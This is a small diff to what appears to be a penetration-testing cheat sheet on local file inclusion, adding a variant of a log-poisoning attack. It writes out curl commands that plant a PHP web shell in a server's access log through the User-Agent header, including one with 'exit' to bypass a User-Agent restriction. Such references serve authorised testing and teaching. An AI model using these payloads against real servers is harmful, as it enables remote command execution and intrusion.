@@ -364,6 +364,11 @@ $ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 ```
 
 Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
+Note2: use exit at the end of payload to bypass User-Agent restriction 
+
+```
+$ curl http://example.org/ -A "<?php echo system($_GET['cmd']); exit; ?>"
+```
 
 Then request the logs via the LFI and execute your command.
 
